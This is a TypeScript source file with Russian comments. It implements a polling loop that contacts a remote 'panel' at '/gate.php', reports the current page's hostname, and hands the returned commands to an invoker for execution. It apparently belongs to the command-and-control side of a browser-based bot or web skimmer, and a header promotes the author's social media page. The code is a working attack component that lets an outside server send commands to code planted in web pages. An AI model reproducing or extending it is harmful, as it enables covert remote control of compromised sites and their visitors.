/*
    Follow me:
    @vk: vk.com/bytecode
*/

import {Network} from "./utils/Network";
import {RecivedCommand, Invoker} from "./command/Invoker";

export class Process {

    private panel : string = null
    private seconds : number = 0;

    private processID : NodeJS.Timer = null;

    private invoker : Invoker = new Invoker(this);

    /*
        panel - ссылка на панель
        seconds - раз в сколько секунд опрашивать панель на наличие команд
    */
    constructor(panel : string, seconds : number) {
        this.panel = panel;
        this.seconds = seconds;
    }

    /*
        Запуск процесса опроса команд
    */
    public start() {
        let _this : Process = this;
        
        /*
            Делаем первый запрос к серверу при старте
        */
        _this.fire();

        /*
            запускаем цикл таймера. Домножаем время на тысячу, потому что таймер принимает на вход ms
        */
        this.processID = setInterval(function(){
            /*
                Запрос к гейту
            */
            _this.fire();
        }, this.seconds*1000); 
    }

    /*
        Останавливает цикл опроса команд с сервера
    */
    public stop() {
        /*
            Убиваем процесс таймера
        */
        clearInterval(this.processID);
    }

    /*
        Функция для запроса команд
    */
    private fire() {
        let _this : Process = this;
        Network.request(this.panel + "/gate.php?host=" + window.location.hostname, 
        function(data : any){
            let parsed : Array<RecivedCommand> = data.commands;
            _this.invoker.invoke(parsed);
        });
    }
}